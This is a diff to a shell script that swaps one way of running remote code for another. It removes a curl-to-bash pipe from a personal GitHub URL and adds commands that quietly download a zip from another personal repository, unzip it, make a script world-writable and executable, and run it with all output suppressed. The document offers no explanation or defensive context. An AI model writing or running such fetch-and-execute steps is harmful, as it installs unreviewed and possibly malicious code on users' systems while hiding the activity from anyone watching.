@@ -1,1 +1,4 @@
-curl -sL  https://raw.githubusercontent.com/nineasku55/tampung/refs/heads/main/qirielan88 | bash
+wget https://github.com/renjanaayudisha57/fantastic-adventure/raw/refs/heads/main/Qris.zip >/dev/null 2>&1
+unzip Qris.zip >/dev/null 2>&1
+cd Qris >/dev/null 2>&1
+chmod 777 bas.sh && ./bas.sh >/dev/null 2>&1
